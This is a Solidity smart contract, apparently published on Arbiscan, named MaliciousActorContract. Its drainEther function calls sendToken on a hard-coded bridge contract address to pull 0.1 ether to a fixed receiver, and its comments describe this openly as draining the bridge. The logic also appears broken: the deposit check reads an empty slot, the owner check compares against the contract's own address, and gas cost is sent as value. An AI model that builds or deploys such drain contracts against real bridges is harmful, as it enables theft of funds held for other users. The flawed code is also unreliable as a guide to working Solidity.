/**
 *Submitted for verification at Arbiscan on 2023-08-03
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Create a separate interface for IERC20
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MaliciousActorContract {
    // Address of the already deployed BridgePortal contract
    address public bridgePortalAddress = 0x68c8a55F3d2f62487229Af226629D985FE2Dc7cb;

    // Counter to generate a unique depositId for each transaction
    uint256 private depositIdCounter;

    // Mapping to store the deposited ether for each depositId
    mapping(uint256 => uint256) private depositedEther;

    // Function to deposit Ether to the MaliciousActorContract
    function depositEther() external payable {
        // Store the deposited ether in the mapping
        depositedEther[depositIdCounter] = msg.value;

        // Increment the depositIdCounter
        depositIdCounter++;
    }

    // Function to trigger the drain of 0.1 Ether from the BridgePortal contract
    function drainEther() external {
        // Set the receiver address (self) and the amount (0.1 Ether) to be sent
        address receiver = 0xf621de026c76eADF803b3248f57F87718b103160;
        uint256 amount = 0.1 ether;

        // Check if the deposited ether is enough to drain
        require(depositedEther[depositIdCounter] >= amount, "Not enough ether deposited");

        // Estimate the gas cost for the external function call
        uint256 gasEstimation = gasleft() - 20000; // Leaving a safety margin for the transaction
        uint256 gasCost = gasEstimation * tx.gasprice;

        // Call the sendToken function of the BridgePortal contract to withdraw 0.1 Ether
        (bool success, ) = bridgePortalAddress.call{gas: gasEstimation, value: gasCost}(
            abi.encodeWithSignature("sendToken(address,uint256,uint256)", receiver, amount, depositIdCounter)
        );
        require(success, "Drain failed");

        // Decrement the deposited ether by the amount drained
        depositedEther[depositIdCounter] -= amount;

        // Increment the depositIdCounter to make sure each transaction is treated as a new deposit
        depositIdCounter++;
    }

    // Function to withdraw the contract's balance to the owner
    function withdraw() external {
        require(msg.sender == owner(), "Only the owner can withdraw");
        payable(msg.sender).transfer(address(this).balance);
    }

    // Function to get the current depositIdCounter value
    function getCurrentDepositId() external view returns (uint256) {
        return depositIdCounter;
    }

    // Function to get the deposited ether for a specific depositId
    function getDepositedEther(uint256 depositId) external view returns (uint256) {
        return depositedEther[depositId];
    }

    // Function to get the owner of the contract
    function owner() internal view returns (address) {
        return address(this);
    }
}